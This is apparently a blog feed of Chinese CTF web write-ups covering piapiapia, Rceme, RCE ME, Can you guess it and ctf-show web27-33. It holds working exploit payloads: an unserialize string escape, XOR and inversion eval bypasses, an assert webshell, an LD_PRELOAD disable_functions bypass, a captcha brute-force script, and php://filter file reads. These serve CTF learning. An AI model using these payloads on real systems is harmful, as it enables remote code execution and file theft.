<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">	<span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;<span class="comment">#/ &#x27; | \\ /</span></span><br><span class="line">	<span class="variable">$string</span> = preg_replace(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);<span class="comment">#在string中将‘还有\\替换成下划线</span></span><br><span class="line"></span><br><span class="line">	<span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">	<span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;<span class="comment">#上面的数组用|隔开</span></span><br><span class="line">	<span class="keyword">return</span> preg_replace(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);<span class="comment">#如果含有以上数组中的值，将其替换为hacker（可以看到别的都是6个字符但是where只有5个字符，如果它替换成hacker那么就会自增字符）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也就是说这里面如果含有被匹配的那些数据，就会被替换，最主要利用的点就是where还有hacker，因为他们的字符不相同，where替换成hacker就会增加1，最后造成字符串逃逸。</p>
<p>也就是说我们需要将nickname提前闭合，然后在后面添加一个我们自己定义的属性，那么后面的属性就会被丢弃</p>
<p>举个例子：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta">$</span><span class="bash">a = array(<span class="string">&#x27;123&#x27;</span>,<span class="string">&#x27;456&#x27;</span>,<span class="string">&#x27;78&#x27;</span>);</span></span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br><span class="line">a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;456&quot;;i:2;s:2:&quot;78&quot;;&#125;</span><br><span class="line">反序列化</span><br><span class="line">array(3) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(3) &quot;123&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(3) &quot;456&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;78&quot;</span><br><span class="line">&#125;</span><br><span class="line">我们将第二个值提前闭合</span><br><span class="line">将456变成456&quot;;i:2;s:4:&quot;7890&quot;;&#125;</span><br><span class="line">a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;456&quot;;i:2;s:4:&quot;7890&quot;;&#125;&quot;;i:2;s:2:&quot;78&quot;;&#125;</span><br><span class="line">那么反序列化之后就会变成</span><br><span class="line">array(3) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(3) &quot;123&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(3) &quot;456&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(4) &quot;7890&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>理解了原理，那我们就需要构造一个闭合让我们构造photo的值为config.php但是因为这里面的字符没办法修改，所以我们需要构造一个不同的，而且我们的photo不是在nickname[]数组里面的所以需要提前构造一个闭合来跳出这个数组，最后在构造一个闭合让photo这个属性覆盖</p>
<p>也就是</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nickname[]=一些字符&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到我们需要构造的一共是34个字符，所以我们需要利用前面的where、hacker替换，每替换一次，我们的一个字符就会覆盖掉原来的一个字符，我们只需要将我们所有的字符全部都覆盖出去，直到闭合就可以替换掉photo里面的属性，构造出我们需要的config.php</p>
<p>也就是我们需要构造34个where就行</p>
<p>最终paiload：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/24/piapiapia/1.png" alt="1"></p>
<p>然后访问profile.php</p>
<p><img src="/2022/03/24/piapiapia/2.png" alt="1"></p>
<p>可以看到上传成功，而我们替换的photo当然是无法回显的，里面的内容正是base64编码之后的config.php的内容，直接解码得到flag</p>
<p><img src="/2022/03/24/piapiapia/3.png" alt="1"></p>
]]></content>
      <tags>
        <tag>0ctf2016</tag>
      </tags>
  </entry>
  <entry>
    <title>Roamphp4-Rceme</title>
    <url>/2022/03/29/Roamphp4-Rceme/</url>
    <content><![CDATA[<h2 id="极客大挑战-2020-Roamphp4-Rceme"><a href="#极客大挑战-2020-Roamphp4-Rceme" class="headerlink" title="[极客大挑战 2020]Roamphp4-Rceme"></a>[极客大挑战 2020]Roamphp4-Rceme</h2><p>进入是一个登录框：可以执行命令，但是需要绕判断，判断md5的值前几位需要与她随机的数相等。</p>
<p>查看一下网页源码：</p>
<p><img src="/2022/03/29/Roamphp4-Rceme/1.png" alt="1"></p>
<p>给出了提示，直接访问<code>.index.php.swp</code>下载源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>] = substr(md5(mt_rand().sha1(mt_rand)),<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(substr(md5(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]),<span class="number">0</span>,<span class="number">5</span>) !== <span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>])&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;Captcha error~\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>] = substr(md5(mt_rand().sha1(mt_rand)),<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">	<span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(strlen(<span class="variable">$code</span>) &gt; <span class="number">70</span> <span class="keyword">or</span> preg_match(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/ixm&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;Longlone not like you~\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">		@<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">		<span class="keyword">die</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>第一个正则过滤了大部分需要的函数，我们可以构造取反拿到，如果需要执行的话需要构造<code>[~(取反)][~%CF]</code>的形式才会执行，这样php会将其分辨成数组，~%CF是0也就是取数组的第一个，这样才能够实验执行函数。</p>
<p>然后利用User-Agent头来打。简单来说就是构造var_dump(getallheaders);拿到所有的头信息，找到User-Agent头，在我们访问的时候进行覆盖，然后用system函数执行。</p>
<p>附上python脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://73e4711e-556a-4ef1-b1d8-3eb54dfbf89b.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line">session =requests.session()</span><br><span class="line">io = session.get(url)</span><br><span class="line">md5_value = re.findall(<span class="string">r&#x27;if:substr\(md5\(\$code\),0,5\)==(.+?)&quot;&#x27;</span>,io.text)[<span class="number">0</span>]</span><br><span class="line">code = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(md5_value)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">s</span>):</span></span><br><span class="line">	<span class="keyword">return</span> hashlib.md5(s.encode()).hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dmd5</span>(<span class="params">code</span>):</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100000001</span>):</span><br><span class="line">		<span class="keyword">if</span> md5(<span class="built_in">str</span>(i)).startswith(code):</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;[*]code:&#x27;</span>,i)</span><br><span class="line">			code = i</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line">code = dmd5(md5_value)<span class="comment">#计算出code</span></span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;tac /*&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cmd=<span class="string">&#x27;[~%8C%86%8C%8B%9A%92][~%CF]([~%91%9A%87%8B][~%CF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][~%CF]()));&#x27;</span></span><br><span class="line">data = <span class="string">f&#x27;code=<span class="subst">&#123;code&#125;</span>&amp;cmd=<span class="subst">&#123;cmd&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">res = session.post(url,data,headers=header)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"><span class="comment">#print(res.headers)</span></span><br></pre></td></tr></table></figure>

<p>运行此脚本拿到flag</p>
]]></content>
      <tags>
        <tag>极客大挑战2020</tag>
      </tags>
  </entry>
  <entry>
    <title>jikedatiaozhan2019-rce-me</title>
    <url>/2022/03/29/jikedatiaozhan2019-rce-me/</url>
    <content><![CDATA[<h1 id="极客大挑战2019-RCE-ME"><a href="#极客大挑战2019-RCE-ME" class="headerlink" title="[极客大挑战2019]RCE ME"></a>[极客大挑战2019]RCE ME</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(strlen(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>分析一下代码，我们需要构造执行语句，语句中不能有任何数字字母，但是符号没有被过滤，可以用异或或者取反绕过，直接构造一个phpinfo</p>
<p><img src="/2022/03/29/jikedatiaozhan2019-rce-me/1.png" alt="1"></p>
<p>可以看到内容成功执行，发现过滤了我们需要执行命令的函数，所以第二部就是想办法构造来绕过disable_function</p>
<p>先构造一个一句话，连上蚁剑</p>
<p>可以直接构造<code>assert($_POST[a]);</code></p>
<p><img src="/2022/03/29/jikedatiaozhan2019-rce-me/3.png" alt="1"></p>
<p>这里提供两种方法来绕过disable_function</p>
<p>一种是直接用蚁剑里面的插件，bypass</p>
<p>发现flag中没东西，readflag中是乱码，查看了一下文件类型</p>
<p><img src="/2022/03/29/jikedatiaozhan2019-rce-me/4.png" alt="1"></p>
<p><img src="/2022/03/29/jikedatiaozhan2019-rce-me/2.png" alt="1"></p>
<p>直接运行拿到flag</p>
<p>第二种是so劫持</p>
<p>因为发现在tmp目录下拥有文件上传权限，我们可以通过上传php脚本来构造调用so，然后我们就可以利用<code>LD_PRELOAD</code>+<code>putenv</code>来构造so劫持，实现命令</p>
<p>（参考链接：<a class="link" href="https://www.anquanke.com/post/id/175403#h2-4%EF%BC%89">https://www.anquanke.com/post/id/175403#h2-4）<i class="fas fa-external-link-alt"></i></a></p>
<p>一般来说是php中利用mail函数进行调用sendmail的时候会触发，sendmail会调用getuid，如果我们在so中编写我们自己的命令，那么他就会在这边执行我们的代码，我们可以直接执行命令重定向到我们想要的文件中，然后进行包含，直接可以拿到flag</p>
<p>流程：构造so文件-&gt;修改里面的执行代码-&gt;重定向到我们想要的文件中-&gt;上传php文件构造os触发mail-&gt;读取文件内容拿到flag</p>
<p>可以利用网上的现成代码（参考链接：<a class="link" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD%EF%BC%89">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD）<i class="fas fa-external-link-alt"></i></a></p>
<p>先上传so文件，然后上传里面的bypass_disablefunction.php文件，然后构造：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=include(%27/var/tmp/bypass_disablefunction.php%27)&amp;cmd=/readflag&amp;outpath=/tmp/tmpfile&amp;sopath=/var/tmp/bypass_disablefunc_x64.so</span><br><span class="line"><span class="meta">#</span><span class="bash">?code=<span class="variable">$&#123;_GET&#125;</span>[_](<span class="variable">$&#123;_GET&#125;</span>[__]);</span></span><br></pre></td></tr></table></figure>



]]></content>
      <tags>
        <tag>极客大挑战2019</tag>
      </tags>
  </entry>
  <entry>
    <title>Can you guess it ?</title>
    <url>/2022/03/31/canyougussit/</url>
    <content><![CDATA[<h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><p>进入题目一个文本框，有一个可以点的地方，点进去看到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  highlight_file(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$secret</span> = bin2hex(random_bytes(<span class="number">64</span>));<span class="comment">#二进制字符转换成16进制</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;<span class="comment">#如果设置post传参guess</span></span><br><span class="line">  <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];<span class="comment">#将其强制转换成string</span></span><br><span class="line">  <span class="keyword">if</span> (hash_equals(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;<span class="comment">#比较两个字符串</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>先看的下面，下面看完了之后发现,<code>bin2hex(random_bytes(64))</code>这里根本进不去，所以得找一个别的地方拿flag，题目提示flag在config.php里面，而且意外的在最前面添加了一个过滤，继续往下看。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  highlight_file(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看来问题就处在这里了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#PHP_SELF	他是返回的当前路径</span><br><span class="line">例如，在地址为 http://example.com/foo/bar.php 的脚本中使用 $_SERVER[&#x27;PHP_SELF&#x27;] 将得到 /foo/bar.php</span><br><span class="line">而basename返回的是文件名部分</span><br><span class="line">也就是说如果我们访问index.php/config.php</span><br><span class="line">我们访问的是index.php但是bsename获得的是config.php</span><br></pre></td></tr></table></figure>

<p>这也解释了为什么在最前面要添加一个过滤，让config.php不能再当前路径的最后位置，再看一下basename的介绍</p>
<p><img src="/2022/03/31/canyougussit/1.png" alt="1"></p>
<p>那么事情就简单了,我们需要构造一个没有正确处理的路径，构造一个字符串，让他放在<code>config.php/</code>后面，然后让他解析的还是config.php而且还要绕过这个检查</p>
<p>写一个脚本测试一下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">  <span class="variable">$s</span> = <span class="string">&#x27;/index.php/config.php/&#x27;</span> . chr(<span class="variable">$i</span>);</span><br><span class="line">  <span class="keyword">if</span> (!check(<span class="variable">$s</span>)) &#123;</span><br><span class="line">    <span class="variable">$t</span> = basename(<span class="string">&#x27;/index.php/config.php/&#x27;</span> . chr(<span class="variable">$i</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;$&#123;i&#125;: $&#123;t&#125;\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现128之后的所有不可见字符都可以，因为不可见字符，所以直接对他进行手动url编码放在路径后面即可,我这里选的是129,也就是%81直接接在这个路劲后面这样basename就不会对他进行解析，从而读取到config.php的内容</p>
]]></content>
      <tags>
        <tag>Zer0pts2020</tag>
      </tags>
  </entry>
  <entry>
    <title>ctf-show(爆破-命令执行-php特性-文件上传-sql注入)</title>
    <url>/2022/02/22/ctf-show(%E7%88%86%E7%A0%B4-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-sql%E6%B3%A8%E5%85%A5-php%E7%89%B9%E6%80%A7)/</url>
    <content><![CDATA[<h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><h3 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h3><h3 id="web-28"><a href="#web-28" class="headerlink" title="web 28"></a>web 28</h3><p><img src="/2022/02/22/ctf-show(%E7%88%86%E7%A0%B4-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-sql%E6%B3%A8%E5%85%A5-php%E7%89%B9%E6%80%A7)/web28_1.png" alt="1"></p>
<p>看到题目里面啥也没有，能爆破的地方只有页面上面的url内容</p>
<p>但是如果改txt内容，网页会将我们重定向</p>
<p><img src="/2022/02/22/ctf-show(%E7%88%86%E7%A0%B4-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-sql%E6%B3%A8%E5%85%A5-php%E7%89%B9%E6%80%A7)/web28_3.png" alt="1"></p>
<p>导致网页访问不了，直接爆破目录/0/1/替换用bp</p>
<p>最后结果是/72/20/</p>
<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只屏蔽了flag</p>
<p>payload：</p>
<p><code>?c= system(&quot;cat fla*&quot;);</code></p>
<h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?c=echo `cat fla*`;</span><br></pre></td></tr></table></figure>

<h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>屏蔽了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">flag system php cat sort shell . 空格  &#x27;</span><br></pre></td></tr></table></figure>

<p>空格过滤，可以用table绕过%09进行绕过</p>
<h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤了</p>
<p><code>flag system php cat sort shell . 空格 &#39; 反撇 echo ; (</code></p>
<p>但是没过滤include可以包含一个post参数然后用伪协议来读取</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<h3 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">flag system php cat sort shell . &#x27; ` echo ; ( &quot;</span><br></pre></td></tr></table></figure>

<p>相比较上一题多过滤了一个双引号，可以post包数字就不需要双引号</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">？c=include$_POST[1]?&gt;</span><br><span class="line">php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

